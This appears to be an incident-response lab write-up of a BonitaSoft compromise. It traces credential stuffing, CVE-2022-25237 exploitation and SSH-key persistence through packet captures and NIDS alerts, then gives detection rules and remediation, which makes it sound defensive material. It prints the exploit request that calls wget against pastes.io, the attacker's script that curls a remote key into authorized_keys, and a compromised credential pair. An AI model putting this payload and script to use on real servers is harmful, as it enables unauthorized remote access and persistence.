**Classification:** TLP:AMBER (Internal Use — SOC / Incident Response)  
**Platform / Environment:** Wireshark / Tshark / Suricata NIDS Alert Triage / Splunk ES  
**Target / Infrastructure:** BonitaSoft Web Server (172.31.6.44:8080) / Domain forela.co.uk  

#### 1. Threat Scenario and Context

- **Executive Summary:** A web application compromise targeting the enterprise BonitaSoft deployment (forela.co.uk:8080) was investigated. Correlation between packet captures (meerkat.pcap) and NIDS alerts (meerkat-alerts.json) confirmed a two-stage intrusion executed from external IP 156.146.62.213. The adversary initially conducted an automated Credential Stuffing attack using custom Python requests against the /bonita/loginservice endpoint, compromising valid credentials for seb.broom@forela.co.uk. Subsequently, the attacker exploited authorization bypass vulnerability **CVE-2022-25237** within the REST API by appending parameter ;i18ntranslation to achieve Remote Code Execution (RCE). The attacker pulled a script from pastes.io that appended an unauthorized public key to /home/ubuntu/.ssh/authorized_keys, securing persistent administrative SSH access.
    
- **Telemetry Sources and Dataset Contents:** Network packet capture meerkat.pcap (7.3 MiB) and Suricata NIDS logs in EVE/JSON format (meerkat-alerts.json). Protocols examined: HTTP, TLSv1.3, TCP, and SSH. Investigation window: January 19, 2023, between 15:29:00 and 15:40:00 UTC.

#### 2. MITRE ATT&CK® Tactical Mapping

| Tactic | Technique / Sub-technique ID | Technique Name | Specific Evidence / Log Found |
|---|---|---|---|
| **Credential Access** | T1110.004 | Brute Force: Credential Stuffing | 118 automated POST requests to /bonita/loginservice using User-Agent python-requests/2.28.1. |
| **Initial Access / Execution** | T1190 | Exploit Public-Facing Application | Exploitation of CVE-2022-25237 in the BonitaSoft REST API via string ;i18ntranslation. |
| **Execution** | T1059.004 | Command and Scripting Interpreter: Unix Shell | Execution of command wget https://pastes.io/raw/bx5gcr0et8 via /bonita/API/extension/rce. |
| **Persistence** | T1098.004 | Account Manipulation: SSH Authorized Keys | Injection of public key hffgra4unv into /home/ubuntu/.ssh/authorized_keys. |
| **Discovery** | T1087.001 | Account Discovery: Local Account | Execution of cat /etc/passwd post-exploitation. |

#### 3. Forensic Investigation Chain and Telemetry Analysis

- **Hunting Hypothesis:** Identify the web application generating high-severity NIDS alerts and isolate the source external IP generating anomalous HTTP requests.
    
- **Operational Queries and Commands:**

``` bash
jq -r '.[] | select(.alert.category | contains("Administrator Privilege Gain")) | [.timestamp, .src_ip, .dest_ip, .alert.signature] | @tsv' meerkat-alerts.json | sort -u
tshark -r meerkat.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri | head -n 10
```

- **Technical Breakdown of Evidence:**
    
    - Alerts signaled privilege escalation attempts directed at internal host **172.31.6.44** on TCP port 8080.
        
    - The target service was identified as **BonitaSoft** (Bonita Web version 2021.2).
        
    - The attacker IP was isolated as **156.146.62.213**.

---

- **Hunting Hypothesis:** Quantify the volume of tested authentication credentials and identify the compromised user account.
    
- **Operational Queries and Commands:**

``` bash
tshark -r meerkat.pcap -Y "http.request.method == \"POST\" && http.request.uri == \"/bonita/loginservice\"" -T fields -e text | grep -v "username=install" | sort -u | wc -l
tshark -r meerkat.pcap -Y "http.response.code == 204 && http.prev_request_in" -T fields -e frame.number -e http.prev_request_in
```

- **Technical Breakdown of Evidence:**
    
    - The adversary issued 118 POST requests using User-Agent `python-requests/2.28.1`.
        
    - Excluding test defaults (`install:install`), the adversary evaluated **56 unique corporate credential pairs**.
        
    - Successful authentication (returning HTTP 204/302 redirects) was achieved with:  
        **seb.broom@forela.co.uk:g0vernm3nt**.

---

- **Hunting Hypothesis:** Identify anomalies within REST API URI patterns indicating an authorization filter bypass.
    
- **Operational Queries and Commands:**

``` bash
tshark -r meerkat.pcap -Y "http.request.uri contains \"i18ntranslation\"" -T fields -e frame.time -e ip.src -e http.request.uri
```

- **Technical Breakdown of Evidence:**
    
    - **Exploited CVE:** **CVE-2022-25237**.
        
    - **Injected Path Bypass:** The attack bypassed `RestAPIAuthorizationFilter` by appending string **i18ntranslation** to the API path (`/bonita/API/extension/rce;i18ntranslation`).
        
    - This allowed unauthenticated command execution:

``` TEXT
GET /bonita/API/extension/rce?p=0&c=1&cmd=wget%20https://pastes.io/raw/bx5gcr0et8 HTTP/1.1
```

---

- **Hunting Hypothesis:** Trace outbound connections from the application server reaching external code-sharing websites.
    
- **Operational Queries and Commands:**

``` bash
tshark -r meerkat.pcap -Y "http.request.uri contains \"pastes.io\" || tls.handshake.extensions_server_name contains \"pastes.io\"" -T fields -e frame.time -e ip.dst -e tls.handshake.extensions_server_name
```

- **Technical Breakdown of Evidence:**
    
    - **External Service:** **pastes.io**.
        
    - The server retrieved script `bx5gcr0et8`, which fetched public key **hffgra4unv**.
        
    - Content of the executed script:

``` bash
#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart
```

- **Modified Host File:** **/home/ubuntu/.ssh/authorized_keys**.
    
- **MITRE Technique:** **T1098.004** (SSH Authorized Keys).

#### 4. Detection Engineering (Alert & Correlation Rules)

``` Suricata
alert http $EXTERNAL_NET any -> $HTTP_SERVERS 8080 (msg:"SOC - Intento de Bypass de Autorizacion en BonitaSoft (CVE-2022-25237)"; flow:to_server,established; http.uri; content:"/bonita/API/"; content:"i18ntranslation"; fast_pattern; classtype:web-application-attack; sid:20260403; rev:1;)
```

- **False Positive Considerations:** None in legitimate operations; `i18ntranslation` should not be passed to RCE extension endpoints.
    
- **Tuning:** Ensure rule engine parses paths using semicolon delimiters and traversal sequences (`/../i18ntranslation/`).

``` SPL
index=os_logs sourcetype=auditd (comm="curl" OR comm="wget" OR comm="bash" OR comm="sh") 
| search a0="*/.ssh/authorized_keys" OR a1="*/.ssh/authorized_keys" OR a2="*/.ssh/authorized_keys"
| where uid=user_web OR user="tomcat" OR user="bonita" OR user="www-data"
| stats count min(_time) as inicio max(_time) as fin values(comm) as binario values(a1) as destino by host, user
| convert ctime(inicio) ctime(fin)
| table inicio, fin, host, user, binario, destino, count
```

- **False Positive Considerations:** Automated configuration management deployments (Ansible/Puppet).
    
- **Tuning:** Exclude standard orchestration accounts, alerting exclusively on web service service accounts.

#### 5. Containment, Remediation, and Hardening Recommendations

1. **Host Isolation:** Isolate host 172.31.6.44 from the production network.
    
2. **SSH Key Remediation:** Inspect `/home/ubuntu/.ssh/authorized_keys` and `/root/.ssh/authorized_keys`, removing public key `hffgra4unv`.
    
3. **Perimeter Blocking:** Block traffic from 156.146.62.213 and drop outbound lookups/connections to pastes.io.
    
4. **Patch Management:** Upgrade the BonitaSoft application to a patched release (>= 2021.2 SP1 / 2022.1) that fixes the `RestAPIAuthorizationFilter` bypass vulnerability.
    
5. **Egress Filtering:** Prevent application servers from making unauthenticated outbound HTTP/HTTPS requests to untrusted file-hosting or code-paste repositories.